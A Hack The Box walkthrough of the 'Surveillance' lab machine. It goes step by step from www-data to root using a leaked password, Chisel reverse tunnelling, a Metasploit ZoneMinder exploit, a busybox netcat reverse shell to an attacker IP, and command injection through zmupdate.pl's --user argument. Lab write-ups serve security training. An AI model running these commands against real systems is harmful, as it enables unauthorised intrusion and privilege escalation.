---
title: [HTB] Surveillance writeup
date: 2023-12-13 12:00:00 -000
cateogries: [Writeup,HTB]
tags: [Writeup,HTB]
---

# Hack The Box - Surveillance

## Summary:

The target machine, named "Surveillance," involves multiple steps for compromise. It begins with establishing a foothold as the www-data user, followed by privilege escalation through the Matthew user. The final escalation results in root access via the Zoneminder user.

### Target Information:

- **IP Address:** `<machine ip>`
- **Users:** www-data, Matthew, zoneminder

## Foothold:

### www-data to Matthew:

1. **Connect as www-data:**
   ```bash
   ssh www-data@<machine ip>
   ```
   Upon successful connection, retrieve the credentials for the Matthew user: `matthew:starcraft122490`.

### Matthew to Zoneminder:

1. **Port Forwarding with Chisel:**
   - Utilize Chisel for secure and efficient port forwarding.
     ```bash
     # Run Chisel server at attacker's machine
     ./chisel server --port 1337 --reverse --socks5
     ```

     ```bash
     # Transfer Chisel to victim's PC
     python -m http.server 8888
     wget <your_ip>:8888/chisel
     chmod +x chisel
     ./chisel client <your_ip>:1337 R:<victim_port>:127.0.0.1:8080 &
     ```

2. **Access Zoneminder CMS:**
   - The forwarded port allows access to the Zoneminder CMS from the attacker's machine. Open the browser and navigate to `http://127.0.0.1:<victim_port>`.

3. **Exploitation with Metasploit:**
   - Utilize Metasploit to exploit a vulnerability in Zoneminder Snapshots.
     ```bash
     msfconsole
     ```

     ```bash
     use exploit/unix/webapp/zoneminder_snapshots
     ```

     ```bash
     set RHOSTS <victim_ip>
     set RPORT <victim_port>
     set LHOST <your_ip>
     set TARGETURI /
     ```

     ```bash
     exploit
     ```

     ```bash
     shell
     ```

   This sequence results in the establishment of a Meterpreter session, providing a shell on the victim machine.

### Retrieve User Flag:

4. **Locate User Flag:**
   - Once in the Meterpreter session, navigate to the user's home directory and retrieve the user flag.
     ```bash
     cat /home/Matthew/user.txt
     ```

## Privilege Escalation:

### Zoneminder to Root:

1. **Prepare Reverse Shell:**
   - Create a reverse shell script (`rev.sh`) and place it in `/tmp` on the victim machine.
     ```bash
     #!/bin/bash
     busybox nc 10.10.xx.xx 443 -e sh
     ```

2. **Start a Listener:**
   - Initiate a listener on the attacker's machine to capture the reverse shell connection at port 443.

3. **Execute Privilege Escalation Command:**
   - Run the following command as the zoneminder user to leverage the `zmupdate.pl` script for privilege escalation.
     ```bash
     sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev.sh)' --pass=ZoneMinderPassword2023
     ```

4. **Retrieve Root Flag:**
   - Upon execution, the reverse shell script triggers a connection to the attacker's machine. Navigate to the root directory and retrieve the root flag.
     ```bash
     cat /root/root.txt
     ```

## Conclusion:

This comprehensive approach ensures a systematic compromise of the target machine, covering initial access, privilege escalation, and retrieval of both user and root flags. It is crucial to replace placeholder values such as `<machine ip>`, `<your_ip>`, and `10.10.xx.xx` with actual values during the exploitation process. Happy hacking!
